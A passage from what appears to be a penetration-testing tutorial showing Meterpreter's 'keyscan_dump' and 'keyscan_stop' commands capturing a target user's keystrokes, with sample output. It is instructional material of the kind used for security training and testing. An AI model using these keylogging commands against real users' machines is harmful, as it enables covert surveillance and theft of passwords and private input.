    information in the target host, the input information can be captured by using
    the keyscan_dump command on the attack host.Meterpreter > keyscan_dumpDumping
    captured keystrokes... < Return > < Return > < Return > < N1 > < Return > 2 <
    Return > 34As can be seen from the output information, the information input by
    the target user has been successfully captured. If the user does not want to continue
    capturing the target host data, the keyboard capture can be stopped.Execute the
    following command:Meterpreter > keyscan_stopStopping the keystroke sniffer...Seeing
    the above output information indicates that the keyboard capture was successfully
